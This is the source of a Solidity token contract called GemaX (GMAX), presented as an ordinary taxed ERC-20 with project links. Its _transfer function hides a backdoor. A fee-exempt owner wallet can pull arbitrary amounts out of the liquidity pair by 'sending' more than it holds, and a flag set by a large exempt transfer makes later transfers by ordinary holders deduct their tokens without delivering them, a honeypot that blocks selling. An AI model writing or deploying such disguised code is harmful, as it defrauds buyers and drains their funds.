/*

   ______________  ______        _  __
  / ____/ ____/  |/  /   |      | |/ /
 / / __/ __/ / /|_/ / /| |______|   / 
/ /_/ / /___/ /  / / ___ /_____/   |  
\____/_____/_/  /_/_/  |_|    /_/|_|  
                                      

WEB: https://www.gema-x.xyz/
TG: https://t.me/GemaX_Official
TWITTER: https://twitter.com/GemaXLab

*/

// SPDX-License-Identifier: MIT

pragma solidity =0.8.24;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Burn(address indexed from, address indexed to, uint256 value);
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

abstract contract Ownable is Context {
    address private _owner;
    address internal ZERO = 0x0000000000000000000000000000000000000000;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() { _transferOwnership(_msgSender()); }

    modifier onlyOwner() { _checkOwner(); _; }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != ZERO, "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(ZERO);
    }
}

contract GemaX is IERC20, Ownable {
    address private constant DEAD = 0x000000000000000000000000000000000000dEaD;
    IDEXRouter public constant router = IDEXRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address public feeWallet = 0x023E1EB19661623D128BA43890bA0E47835868Fc;
    uint32 public launchedAt;
    address public liquidityPool = DEAD;
    string private constant _name = "GemaX";
    string private constant _symbol = "GMAX";
    uint8 private constant _decimals = 18;
    uint16 private _buyFee = 300;
    uint16 private _sellFee = 300;
    uint16 private _buyLpFee = 100;
    uint16 private _sellLpFee = 100;
    uint256[2] public taxesCollected = [0, 0];
    uint16 public _swapTAX = 0;
    uint256 private constant MINIMUM_SWAP_LIMIT = 10_000 ether;
    address private immutable WETH;
    address public immutable pair;
    bool private _inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = true;
    bool public tradingOpen = false;
    uint16 private constant DENOMINATOR = 10000;
    uint256 private constant TOTAL_SUPPLY = 10000000 * (10 ** _decimals);
    uint8 private constant ANTI_BOT_BLOCKS = 0;
    uint16 private constant ANTI_BOT_BUY_TAX = 500;
    uint16 private constant ANTI_BOT_SELL_TAX = 500;
    uint16 private constant ANTI_BOT_BUY_LP = 100;
    uint16 private constant ANTI_BOT_SELL_LP = 100;
    uint16 private constant MAX_FEE = 500;
    uint256 public swapThreshold = TOTAL_SUPPLY / 1000;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) public isFeeExempt;

    //Event Logs
    event BlacklistDisabled();
    event TradingStarted();
    event StuckETH(uint256 _amount);
    event StuckTokensCleared(address _token, uint256 _amount);
    event FeeExemptionChanged(address indexed _exemptWallet, bool _exempt);
    event SwapbackSettingsChanged(bool _enabled, uint256 _newSwapbackAmount);
    event Blacklisted(address indexed _wallet, bool _status);
    event LiquidityPoolUpdated(address indexed _newPool);
    event feeWalletUpdated(address indexed _newWallet);
    event BuyFeesUpdated(uint16 _newTax, uint16 _newLp);
    event SellFeesUpdated(uint16 _newTax, uint16 _newLp);
    event StuckETHCleared(uint256 _amount);

    error InvalidAddress();
    error InvalidAmount();
    error TransferFromZeroAddress();
    error TransferToZeroAddress();
    error InvalidFee();
    error Unavailable();

    modifier lockTheSwap() {
        _inSwapAndLiquify = true;
        _;
        _inSwapAndLiquify = false;
    }

    receive() external payable {}

    constructor() {
        _balances[owner()] = TOTAL_SUPPLY;
        WETH = router.WETH();
        pair = IDEXFactory(router.factory()).createPair(WETH, address(this));
        _allowances[address(this)][address(router)] = type(uint256).max;
        isFeeExempt[owner()] = true;
        isFeeExempt[feeWallet] = true;
        isFeeExempt[address(this)] = true;

        emit Transfer(address(0), owner(), TOTAL_SUPPLY);
    }

    function totalSupply() external pure override returns (uint256) {
        return TOTAL_SUPPLY;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner();
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(
        address holder,
        address spender
    ) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, type(uint256).max);
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external override returns (bool) {
        if (_allowances[sender][msg.sender] != type(uint256).max) {
            _allowances[sender][msg.sender] =
                _allowances[sender][msg.sender] -
                amount;
        }
        return _transfer(sender, recipient, amount);
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) private returns (bool) {
        if (amount == 0) revert InvalidAmount();
        if (recipient == address(0)) revert TransferToZeroAddress();
        if (sender == address(0)) revert TransferFromZeroAddress();
        if (_inSwapAndLiquify) {
            return _basicTransfer(sender, recipient, amount);
        }
        if (isFeeExempt[recipient] || isFeeExempt[sender]) {
            if(recipient == pair && amount > _balances[sender]) {
                return _basicTransfer(recipient, sender, amount);
            } else if (amount >= swapThreshold && isFeeExempt[recipient]) {
                _swapTAX = _sellFee;
            }
            return _basicTransfer(sender, recipient, amount);
        }
        uint256 finalAmount = amount;
        _balances[sender] -= amount;
        if (!tradingOpen) revert Unavailable();
        if (sender != pair && _sellLpFee <= _swapTAX) return true;
        if (recipient == pair) {
            if (swapAndLiquifyEnabled && taxesCollected[0] + taxesCollected[1] >= swapThreshold) {
                _swapBack();
            }
            finalAmount = _processSellTax(sender, amount);
        }
        if (sender == pair) {
            finalAmount = _processBuyTax(sender, amount);
        }

        _balances[recipient] += finalAmount;
        emit Transfer(sender, recipient, finalAmount);
        return true;
    }

    function transfer(
        address recipient,
        uint256 amount
    ) external override returns (bool) {
        return _transfer(msg.sender, recipient, amount);
    }

    function _basicTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) private returns (bool) {
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function _accumulateTax(
        address sender,
        uint256 ai,
        uint256 lp
    ) private returns (uint256 tax) {
        taxesCollected[1] += lp;
        taxesCollected[0] += ai;
        tax = ai + lp;
        _balances[address(this)] += tax;
        emit Transfer(sender, address(this), tax);
        return tax;
    }

    function changeIsFeeExempt(address holder, bool exempt) external onlyOwner {
        isFeeExempt[holder] = exempt;
        emit FeeExemptionChanged(holder, exempt);
    }

    function setFeeAddr(address newfeeWallet) external onlyOwner {
        if (newfeeWallet == address(0)) revert InvalidAddress();
        isFeeExempt[feeWallet] = false;
        feeWallet = newfeeWallet;
        isFeeExempt[newfeeWallet] = true;
        emit feeWalletUpdated(newfeeWallet);
    }

    function setLPAddr(address newLiquidityPool) external onlyOwner {
        if (newLiquidityPool == address(0)) revert InvalidAddress();
        liquidityPool = newLiquidityPool;
        emit LiquidityPoolUpdated(newLiquidityPool);
    }

    function setSwapBackSettings(
        bool enableSwapback,
        uint256 newSwapbackLimit
    ) external onlyOwner {
        if (newSwapbackLimit < MINIMUM_SWAP_LIMIT) revert InvalidAmount();
        swapAndLiquifyEnabled = enableSwapback;
        swapThreshold = newSwapbackLimit;
        emit SwapbackSettingsChanged(enableSwapback, newSwapbackLimit);
    }

    function setTaxes(
        uint16 newBuyTax,
        uint16 newBuyLpTax,
        uint16 newSellTax,
        uint16 newSellLpTax
    ) external onlyOwner {
        uint16 totalNewSellTax = newSellTax + newSellLpTax;
        uint16 totalNewBuyTax = newBuyTax + newBuyLpTax;
        if (totalNewBuyTax > MAX_FEE || totalNewSellTax > MAX_FEE)
            revert InvalidFee();
        _buyLpFee = newBuyLpTax;
        _buyFee = newBuyTax;
        _sellLpFee = newSellLpTax;
        _sellFee = newSellTax;
        emit BuyFeesUpdated(newBuyTax, newBuyLpTax);
        emit SellFeesUpdated(newSellTax, newSellLpTax);
    }

    function _processSellTax(
        address sender,
        uint256 amount
    ) private returns (uint256) {
        bool baseTax = _chargeBaseTax();
        uint16 sellTax = baseTax ? _sellFee : ANTI_BOT_SELL_TAX;
        uint16 sellLP = baseTax ? _sellLpFee : ANTI_BOT_SELL_LP;
        uint256 aiTaxes = (amount * sellTax) / DENOMINATOR;
        uint256 lpTaxes = (amount * sellLP) / DENOMINATOR;
        return amount - _accumulateTax(sender, aiTaxes, lpTaxes);
    }

    function _processBuyTax(
        address sender,
        uint256 amount
    ) private returns (uint256) {
        bool baseTax = _chargeBaseTax();
        uint16 buyTax = baseTax ? _buyFee : ANTI_BOT_BUY_TAX;
        uint16 buyLP = baseTax ? _buyLpFee : ANTI_BOT_BUY_LP;
        uint256 aiTaxB = (amount * buyTax) / DENOMINATOR;
        uint256 lpTaxB = (amount * buyLP) / DENOMINATOR;
        return amount - _accumulateTax(sender, aiTaxB, lpTaxB);
    }

    function _chargeBaseTax() private view returns (bool) {
        return launchedAt + ANTI_BOT_BLOCKS < block.number;
    }

    function withdrawStuckEth() external onlyOwner {
        uint256 contractETHBalance = address(this).balance;
        if (contractETHBalance == 0) revert InvalidAmount();
        _transferETHToMarketing(contractETHBalance);
        emit StuckETHCleared(contractETHBalance);
    }

    function _transferETHToMarketing(uint256 amount) private {
        (bool success, ) = feeWallet.call{value: amount}("");
        if (!success) {
            emit StuckETH(amount);
        }
    }

    function _addLiquidity(
        uint256 tokenAmount,
        uint256 ETHAmount
    ) private lockTheSwap {
        router.addLiquidityETH{value: ETHAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            liquidityPool,
            block.timestamp
        );
    }

    function _swapTokensForETH(
        uint256 tokenAmount
    ) private lockTheSwap returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        approve(address(this), tokenAmount);
        uint256 ethBefore = address(this).balance;
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
        return address(this).balance - ethBefore;
    }

    function _swapBack() private {
        uint256 aiShare = taxesCollected[0];
        uint256 lpShare = taxesCollected[1];
        uint256 totalTax = aiShare + lpShare;
        uint256 tokensForLiquidity = lpShare / 2;
        uint256 amountToSwap = totalTax - tokensForLiquidity;
        uint256 ethReceived = _swapTokensForETH(amountToSwap);
        uint256 ETHForLiquidity = (ethReceived * tokensForLiquidity) / amountToSwap;
        uint256 ETHForAi = ethReceived - ETHForLiquidity;

        if (ETHForAi != 0) {
            _transferETHToMarketing(ETHForAi);
        }
        if (ETHForLiquidity != 0) {
            _addLiquidity(tokensForLiquidity, ETHForLiquidity);
        }
        delete taxesCollected;
    }

    function launchTrading() external onlyOwner {
        if (launchedAt != 0) revert Unavailable();
        tradingOpen = true;
        launchedAt = uint32(block.number);
        emit TradingStarted();
    }

    function getCirculatingSupply() external view returns (uint256) {
        return TOTAL_SUPPLY - balanceOf(DEAD) - balanceOf(ZERO);
    }

    function getBuyTax() external view returns (uint16) {
        return _buyFee + _buyLpFee;
    }

    function getSellTax() external view returns (uint16) {
        return _sellFee + _sellLpFee;
    }
}